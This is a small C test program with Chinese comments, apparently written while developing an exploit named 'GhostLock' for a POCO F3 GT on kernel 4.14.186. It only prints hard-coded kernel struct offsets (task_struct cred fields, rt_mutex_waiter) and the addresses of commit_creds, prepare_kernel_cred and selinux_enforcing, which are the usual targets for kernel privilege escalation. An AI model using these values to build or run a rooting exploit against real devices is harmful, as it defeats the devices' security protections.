/*
 * test_main.c - 简单的测试程序
 *
 * 验证提取的偏移是否正确
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

int main() {
    printf("=== GhostLock 测试 - POCO F3 GT (aresin) ===\n");
    printf("内核: 4.14.186\n\n");

    printf("[*] 提取的偏移:\n");
    printf("  rt_mutex_waiter:\n");
    printf("    tree_entry: 0x00\n");
    printf("    pi_tree_entry: 0x18\n");
    printf("    task: 0x30\n");
    printf("    lock: 0x38\n");
    printf("    prio: 0x40\n");
    printf("    deadline: 0x48\n");

    printf("\n  task_struct:\n");
    printf("    prio: 0x84\n");
    printf("    real_cred: 0x788\n");
    printf("    cred: 0x790\n");
    printf("    pi_lock: 0x85c\n");
    printf("    pi_blocked_on: 0x880\n");

    printf("\n[*] 内核地址:\n");
    printf("  KIMAGE_TEXT_BASE: 0x%lx\n", 0xffffff939bc80000UL);
    printf("  commit_creds: 0x%lx\n", 0xffffff939bce41e0UL);
    printf("  prepare_kernel_cred: 0x%lx\n", 0xffffff939bce4578UL);
    printf("  selinux_enforcing: 0x%lx\n", 0xffffff939dd00b28UL);

    printf("\n[*] 测试完成!\n");
    return 0;
}
